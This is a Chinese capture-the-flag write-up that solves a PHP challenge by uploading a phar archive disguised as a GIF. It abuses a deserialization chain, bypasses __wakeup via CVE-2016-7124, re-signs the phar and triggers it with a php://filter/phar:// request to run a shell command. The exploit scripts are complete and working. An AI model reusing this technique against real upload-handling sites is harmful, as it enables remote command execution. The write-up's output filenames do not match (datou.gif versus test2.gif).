# file_phar_include



下载附件，审计源代码，class.php有一条反序列化链，就两个类，调用链也比较简单：

```plain
file#__destrcut()
  file#__call()
    data#__set()
      data#yyyou()
```

![img](https://cdn.nlark.com/yuque/0/2023/png/28160573/1686578937962-a2d4b7f0-95ce-482c-a3d2-5d4adafaadd7.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_54%2Ctext_4oCc5aSn5aS0U0VD4oCd5YWs5LyX5Y-3%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10)

有以下几个注意点：

- 题目需要绕过__wakeup，用CVE-2016-7124修改属性数量绕过即可
- file->data传参用data伪协议传即可

再看file.php：

- 题目只允许上传jpg、gif、png后缀

![img](https://cdn.nlark.com/yuque/0/2023/png/28160573/1686579135691-d9a531be-ad72-40f9-a91d-d97af87a2b28.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_38%2Ctext_4oCc5aSn5aS0U0VD4oCd5YWs5LyX5Y-3%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10)

最后看index.php：

- 正则匹配没有过滤php://filter，因此可以用php://filter打phar反序列化
- 题目用了mime_content_type函数，该函数参数完全可控，可以触发phar反序列化

![img](https://cdn.nlark.com/yuque/0/2023/png/28160573/1686579170545-6a73765a-7707-47bb-b6ea-39a8c3357c35.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_62%2Ctext_4oCc5aSn5aS0U0VD4oCd5YWs5LyX5Y-3%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10)

攻击思路很明确了，就是传个jpg结尾的phar文件，然后打phar反序列化即可：

```
<?php
class file
{
    public $name;
    public $data;
    public $ou;
}

class data
{
    public $a;
    public $oi;
}

$a=new file();
$b=new file();
$c=new data();
$a->data="data://text/plain,HelloCCCXHT";
$a->name=$b;
$b->ou=$c;
$c->oi="cat /flag > /var/www/html/upload/flag.txt";

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->setStub("GIF89a" . " __HALT_COMPILER(); ?>");
$phar->setMetadata($a); // 设置序列化数据
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
rename("test.phar", "test.gif");
```



运行后，会在本地生成test.gif文件，但是我们要绕过__wakeup，因此我们还需要修改test.gif的数据，用010打开test.gif：

- 原本是序列化对象属性个数是3，这里改成4

![img](https://cdn.nlark.com/yuque/0/2023/png/28160573/1686579418768-31353718-e584-418e-8f90-c35a7fafbe3b.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_36%2Ctext_4oCc5aSn5aS0U0VD4oCd5YWs5LyX5Y-3%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10)

由于我们修改了phar中的metadata数据，因此签名也需要重新计算：

```python
from hashlib import sha1
f = open('./test.gif', 'rb').read() # 修改内容后的phar文件
s = f[:-28] # 获取要签名的数据
print(s)
h = f[-8:] # 获取签名类型以及GBMB标识
print(h)
newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB
open('test2.gif', 'wb').write(newf) # 写入新文件
```

用上方脚本计算完成后，在当前目录会生成datou.gif文件：

上传datou.gif文件

![img](https://cdn.nlark.com/yuque/0/2023/png/28160573/1686579589530-3cc00edd-6075-424e-bb1b-922a8ba550f1.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_34%2Ctext_4oCc5aSn5aS0U0VD4oCd5YWs5LyX5Y-3%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10)

再phar包含一下：

```plain
filepath=php://filter/resource=phar:///var/www/html/upload/6a1b42d02ffab12f27cfb88bf422aba9.jpg
```

![img](https://cdn.nlark.com/yuque/0/2023/png/28160573/1686579651788-5cb1fb45-c38e-4646-9efc-a303b5900034.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_43%2Ctext_4oCc5aSn5aS0U0VD4oCd5YWs5LyX5Y-3%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10)

flag就保存在/upload/flag.txt中了：

![image-20250818202503675](https://cdn.jsdelivr.net/gh/SuperHUANGLEI/image/image-20250818202503675.png)

flag

```

```

